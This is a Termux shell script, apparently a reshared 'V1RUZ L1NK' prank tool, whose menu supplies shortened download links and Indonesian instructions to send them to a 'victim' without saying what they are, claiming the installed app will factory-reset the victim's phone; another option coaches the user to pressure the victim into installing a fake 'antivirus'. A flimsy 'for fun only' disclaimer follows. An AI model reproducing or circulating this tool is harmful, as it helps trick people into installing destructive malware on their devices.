# BlueSec2024
# Colours
#-----------------
red="\e[91m"
rset="\e[0m"
grn="\e[92m"
ylo="\e[93m"
blue="\e[94m"
cyan="\e[96m"
pink="\e[95m"
#-----------------
# scripting start
banner(){
clear
vid
echo -e '\e[91m               
───────█████████████████████
────████▀─────────────────▀████
──███▀───────────────────────▀███
─██▀───────────────────────────▀██
█▀───────────────────────────────▀█
█─────────\e[93mV1RUZ L1NK V2.1\e[91m─────────█
█─────────────────────────────────█
█─────────────────────────────────█
█───█████─────────────────█████───█
█──██▓▓▓███─────────────███▓▓▓██──█
█──██▓▓▓▓▓██───────────██▓▓▓▓▓██──█
█──██▓▓▓▓▓▓██─────────██▓▓▓▓▓▓██──█
█▄──████▓▓▓▓██───────██▓▓▓▓████──▄█
▀█▄───▀███▓▓▓██─────██▓▓▓███▀───▄█▀
──█▄────▀█████▀─────▀█████▀────▄█
─▄██───────────▄█─█▄───────────██▄
─███───────────██─██───────────███
─███───────────────────────────███
──▀██──██▀██──█──█──█──██▀██──██▀
───▀████▀─██──█──█──█──██─▀████▀
────▀██▀──██──█──█──█──██──▀██▀
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
───────────█▄▄█▄▄█▄▄█▄▄█

' 
echo " " 
echo -e "$red                       ▶$ylo CoDe By$grn ABDUL$red◀$rset"
echo -e "$red                        ⫸$cyan  BlueSec$red ⫷$rset"
echo 
# Functions
echo -e "$red                    [V1RUZ L1NK them with fun]$rset"
echo " "
echo " "
}
baner1(){
clear
echo -e '\e[91m               
───────█████████████████████
────████▀─────────────────▀████
──███▀───────────────────────▀███
─██▀───────────────────────────▀██
█▀───────────────────────────────▀█
█─────────\e[93mV1RUZ L1NK V2.1\e[91m─────────█
█─────────────────────────────────█
█─────────────────────────────────█
█───█████─────────────────█████───█
█──██▓▓▓███─────────────███▓▓▓██──█
█──██▓▓▓▓▓██───────────██▓▓▓▓▓██──█
█──██▓▓▓▓▓▓██─────────██▓▓▓▓▓▓██──█
█▄──████▓▓▓▓██───────██▓▓▓▓████──▄█
▀█▄───▀███▓▓▓██─────██▓▓▓███▀───▄█▀
──█▄────▀█████▀─────▀█████▀────▄█
─▄██───────────▄█─█▄───────────██▄  
─███───────────██─██───────────███
─███───────────────────────────███
──▀██──██▀██──█──█──█──██▀██──██▀
───▀████▀─██──█──█──█──██─▀████▀
────▀██▀──██──█──█──█──██──▀██▀
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
───────────█▄▄█▄▄█▄▄█▄▄█

'
echo " " 
echo -e "$red                       ▶$yloCoDe By$grn ABDUL$red◀$rset"
echo -e "$red                        ⫸$cyan BlueSec$red ⫷$rset"
echo 
# Functions
echo -e "$blue                    [ V1RUZ L1NK them with fun ]$rset"
echo " "
echo " "
}
menu(){
echo -e "$grn             ＞＞＞＞＞$blue [Options]$grn ＜＜＜＜＜$rset"
echo " "
echo " "
echo -e "$red                        ➡$cyan [\e[92m1\e[96m] Viruz now"
echo -e "$red                        ➡$cyan [\e[92m2\e[96m] Save now"
echo -e "$red                        ➡$cyan [\e[92m3\e[96m] About"
echo -e "$red                        ➡$cyan [\e[92m4\e[96m] Update script "
echo -e "$red                        ➡$cyan [\e[92m5\e[96m] WhatsApp Chat"
echo -e "$red                        ➡$cyan [\e[92m6\e[96m] Telegram Chat"
echo -e "$red                        ➡$cyan [\e[92m7\e[96m] Join Channel Telegram"
echo -e "$red                        ➡$cyan [\e[92m8\e[96m] Exit"
echo " "
echo " "
echo -e "$grn              ＞＞＞＞＞$ylo [SELECT]$grn ＜＜＜＜＜$rset"
echo " "
echo -ne "\e[93m[\e[94m BlueSec\e[93m ]\e[96m-\e[93m[\e[94m SELECT OPTION\e[93m ]\e[92m: "
read optnz
if [ $optnz = "1" ];
then
virus
elif [ $optnz = "2" ];
then
save
elif [ $optnz = "3" ];
then
about
elif [ $optnz = "4" ];
then
upd
elif [ $optnz = "5" ];
then
am start -a android.intent.action.VIEW -d https://wa.me/6281247065866 > /dev/null 2>&1
banner
menu
elif [ $optnz = "6" ];
then
am start -a android.intent.action.VIEW -d https://t.me/BlueSec2024 > /dev/null 2>&1
banner
menu
elif [ $optnz = "7" ];
then
am start -a android.intent.action.VIEW -d https://t.me/bluesec > /dev/null 2>&1
banner
menu
elif [ $optnz = "8" ];
then
exit 1
else
echo "wrong"
exit
fi
}
virus(){
################
clear
echo
echo -e '\e[92m 
                    _  _  _____  ____  ____ 
                   ( \( )(  _  )(_  _)( ___)
                    )  (  )(_)(   )(   )__) 
                   (_)\_)(_____) (__) (____) '
echo " "
echo -e "\e[91m 😈  Salin tautan di bawah ini dan kirimkan ke korban Anda dan
mengatakan apa-apa padanya. ketika dia menginstalnya di miliknya
perangkat itu akan diatur ulang pabrik dan banyak lagi yang terjadi.
                                👇👇👇

         \e[92mL1NK :- \e[96mhttps://tinyurl.com/uppdatesnew\e[91m

                                 👆👆👆
Gunakan hanya untuk tujuan bersenang-senang bukan untuk merugikan seseorang.
Dan saya tidak bertanggung jawab atas segala jenis kerugian
yang anda lakukan untuk orang lain dengan skrip ini."
echo
echo -ne "\e[93m[\e[94m BlueSec\e[93m ]\e[96m-\e[93m[\e[94m EXIT untuk kembali\e[93m ]\e[92m: "
read exitz
if [ $exitz = "exit" ];
then
banner
menu
else
banner
menu
fi
}
save(){
clear
echo
echo -e '\e[92m 
                    _  _  _____  ____  ____ 
                   ( \( )(  _  )(_  _)( ___)
                    )  (  )(_)(   )(   )__) 
                   (_)\_)(_____) (__) (____) '
echo " "
echo " "
echo -e "\e[93m  Salin tautan di bawah ini dan kirimkan korban Anda dan beri tahu dia
bahwa dia harus menginstal aplikasi ini atau aplikasinya
perangkat tidak akan dipulihkan.(Antivirus)
                    👇👇👇

        \e[92mL1NK :- \e[96mhttps://bit.ly/3fX8ljZ\e[93m

                    👆👆👆
Gunakan hanya untuk tujuan bersenang-senang bukan untuk merugikan seseorang.
Dan saya tidak bertanggung jawab atas segala jenis
kerugian yang Anda lakukan pada orang lain dengan skrip ini."
echo
echo -ne "\e[93m[\e[94m BlueSec\e[93m ]\e[96m-\e[93m[\e[94m EXIT untuk kembali\e[93m ]\e[92m: "
read exitz
if [ $exitz = "exit" ];
then
banner
menu
else
banner
menu
fi
}
about(){
clear
echo -e '\e[91m
         ──▐─▌──▐─▌──
         ─▐▌─▐▌▐▌─▐▌─
         ─█▄▀▄██▄▀▄█─
         ──▄──██▌─▄──
         ▄▀─█▀██▀█─▀▄
         ▐▌▐▌─▐▌─▐▌▐▌
         ─▐─█────█─▌─
         ────▌──▐────
'
sleep 6.0
banner
menu
}
upd(){
if [ -d "$HOME/infect" ];
then
cd $HOME
rm -rf infect
elif [ -d "$HOME/Infect" ];
then
cd $HOME
rm -rf Infect
else
echo
exit 1
fi
cd $HOME
sleep 1
echo -e "         \e[96mUPDATE IS GOING ON, PLEASE WAIT FOR A WHILE...!\e[0m"
echo
printf "                     \e[96m["
# While process is running...
while git clone https://github.com/noob-hackers/infect 2> /dev/null; do 
    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
    sleep 1
done
printf "\e[96m]\e[0m"
echo
echo
echo
printf "\e[96m           UPDATE SUCCESSFULL (LATEST VERSION)..!\e[0m"
sleep 2.0
cd $HOME
cd infect
bash infect.sh
}
vid(){
FILE=$HOME
if [ -f "$FILE" ]; then
pop
else
echo
fi
}
pop(){
clear
echo -e "\e[96m                ╔═══════════════════════════════════╗\e[0m"
echo -e "\e[96m                ║  \e[93mHAI, I JUST UPLOADED NEW\e[96m VIDEO   ║\e[0m"
echo -e "\e[96m                ║      WATCH NEW VIDEO NOW.....!    ║\e[0m"
echo -e "\e[96m                ║                                   ║\e[0m"
echo -e "\e[96m                ║        Select \e[92my\e[96m to watch\e[96m          ║\e[0m"
echo -e "\e[96m                ║                (\e[93mOR\e[96m)               \e[96m║\e[0m"
echo -e "\e[96m                ║        Select \e[91mt\e[96m to cancel\e[96m         ║\e[0m"
echo -e "\e[96m                ║                (\e[93mOR\e[96m)               \e[96m║\e[0m"
echo -e "\e[96m                ║     Select \e[91mz\e[96m to skipforever\e[96m       ║\e[0m"
echo -e "\e[96m                ╚═══════════════════════════════════╝\e[0m"
echo -en "\e[32mSELECT OPTION [\e[93my/\e[93mt/\e[32m\e[93mz\e[32m]: \e[0m "
read p
if [ "$p" = "y" ];
then
am start -a android.intent.action.VIEW -d https://noobhacktube.com 2>/dev/null
clear
baner1
menu
elif [ "$p" = "t" ];
then
clear
baner1
menu
elif [ "$p" = "z" ];
then
cd $HOM/infect
rm noob.noob
banner
menu
else
banner
menu
exit
fi
}
banner
menu
